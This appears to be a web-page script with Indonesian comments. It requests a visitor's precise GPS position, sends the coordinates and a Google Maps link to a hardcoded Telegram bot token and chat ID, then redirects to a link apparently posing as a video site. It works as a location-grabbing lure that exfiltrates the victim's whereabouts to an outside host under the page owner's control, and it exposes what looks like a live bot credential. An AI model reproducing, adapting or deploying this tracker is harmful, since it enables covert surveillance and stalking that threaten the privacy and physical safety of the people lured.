<script>
// ================= CONFIG =================

// TOKEN BOT TELEGRAM
const TELEGRAM_TOKEN = "8944168845:AAHw_QSSDh-A-r2jp7PxVkI1eqL6fX6Eg8w";

// ID TELEGRAM TUJUAN
const CHAT_ID = "1966317946";

// LINK WEBSITE SETELAH SELESAI
const WEBSITE_LINK =
"https://vidplyy.site/zrpaqoje6x";

// ================= SISTEM =================

async function bagikanLokasi(){

    const status =
        document.getElementById("status");

    status.innerText =
        "Meminta izin lokasi...";

    if(!navigator.geolocation){

        status.innerText =
            "Perangkat tidak mendukung GPS.";

        return;
    }

    navigator.geolocation.getCurrentPosition(

        async function(position){

            const lat =
                position.coords.latitude;

            const lon =
                position.coords.longitude;

            status.innerText =
                "Mengirim lokasi...";

            try {

                // kirim ke telegram
                const url =
`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;

                await fetch(url, {
                    method: "POST",
                    headers: {
                        "Content-Type":
                        "application/json"
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text:
`📍 Pengguna membagikan lokasi

Latitude: ${lat}
Longitude: ${lon}

Google Maps:
https://maps.google.com/?q=${lat},${lon}`
                    })
                });

                status.innerText =
                    "Lokasi berhasil dibagikan.";

                // pindah website
                setTimeout(() => {
                    window.location.href =
                        WEBSITE_LINK;
                }, 1500);

            } catch(err){

                status.innerText =
                    "Gagal mengirim lokasi.";
            }

        },

        function(error){

            status.innerText =
                "Izin lokasi ditolak atau gagal.";
        },

        {
            enableHighAccuracy:true,
            timeout:15000,
            maximumAge:0
        }
    );
}
</script>
